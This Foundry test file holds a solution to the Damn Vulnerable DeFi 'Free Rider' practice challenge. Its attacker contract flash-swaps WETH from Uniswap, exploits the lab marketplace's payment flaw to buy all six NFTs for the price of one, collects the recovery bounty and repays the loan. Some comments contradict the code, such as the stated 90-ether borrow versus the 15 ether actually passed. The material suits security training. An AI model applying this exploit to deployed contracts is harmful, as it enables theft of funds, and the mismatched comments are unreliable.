// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";


// New import
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// Rider Attacker
contract FreeRiderAttacker is IERC721Receiver {
    using Address for address payable;

    IUniswapV2Pair public immutable pair;
    WETH public immutable weth;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    FreeRiderRecoveryManager public immutable recoveryManager;
    address public immutable player;

    uint256[] public idsToBuy;

    constructor(
        address _pair,
        address payable _weth,
        address payable _marketplace,
        address _nft,
        address _recoveryManager,
        address _player,
        uint256[] memory _ids
    ) {
        pair = IUniswapV2Pair(_pair);
        weth = WETH(_weth);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        player = _player;

        // copy ids
        idsToBuy = _ids;
    }

    /// @notice start the exploit: flash-swap WETH out of the pair
    /// amountWethOut must equal 6 * 15 ether = 90 ether in the challenge
    function attack(uint256 amountWethOut) external {
        // pair.swap(amount0Out, amount1Out, to, data)
        // our pair has token0 == WETH (see test), so amount0Out = amountWethOut
        // pass non-empty data to trigger uniswapV2Call
        bytes memory data = abi.encode(amountWethOut);
        pair.swap(amountWethOut, 0, address(this), data);
    }

    /**
     * UniswapV2 callback — called by the pair after it has transferred WETH to this contract.
     * We unwrap WETH -> ETH, call marketplace.buyMany{value: totalPrice}(ids)
     * During each NFT transfer marketplace will call onERC721Received on this contract,
     * where we forward the NFT to the recoveryManager with data = abi.encode(address(this))
     * so the recovery manager will send the bounty to this contract when all NFTs are received.
     *
     * After buyMany completes we will have:
     * - ETH from marketplace payouts,
     * - ETH bounty from recoveryManager (after last transfer),
     * so we can wrap enough WETH and repay the pair (amount + fee).
     */
    function uniswapV2Call(
        address /* sender */,
        uint256 amount0,
        uint256 /* amount1 */,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "only pair");
        uint256 amountBorrowed = abi.decode(data, (uint256));

        // 1) unwrap WETH -> ETH
        weth.withdraw(amountBorrowed);

        // 2) buy all NFTs (marketplace will now pay us after each buy)
        marketplace.buyMany{value: address(this).balance}(idsToBuy);

        // 3) now that we’ve been paid, forward NFTs to recovery (triggers bounty on last)
        for (uint256 i = 0; i < idsToBuy.length; ++i) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                idsToBuy[i],
                abi.encode(address(this))
            );
        }

        // 4) repay flash swap (0.3% fee)
        uint256 amountToRepay = (amountBorrowed * 1000) / 997 + 1;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

        // 5) profit -> player
        payable(player).transfer(address(this).balance);
    }

    // IMPORTANT: don't forward here; just accept the NFT
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        // Prepare ids array
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; ++i) ids[i] = i;

        // Deploy attacker contract as player (msg.sender / tx.origin = player)
        FreeRiderAttacker attacker = new FreeRiderAttacker(
            address(uniswapPair),
            payable(weth),
            payable(marketplace),
            address(nft),
            address(recoveryManager),
            player,
            ids
        );

            // compute amount to borrow: 6 * 15 ETH = 90 ETH
        uint256 amountToBorrow = 15 ether;

            // Start the attack. This will:
            // - flash-swap WETH out from Uniswap,
            // - unwrap to ETH,
            // - call marketplace.buyMany{value:90}(ids),
            // - on each receive, forward NFTs to recoveryManager with data=abi.encode(attacker),
            // - recoveryManager will send bounty 45 ETH to attacker when all 6 are received,
            // - attacker wraps WETH and repays Uniswap (including fee),
            // - leftover ETH is sent to player (profit).
        attacker.attack(amountToBorrow);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}
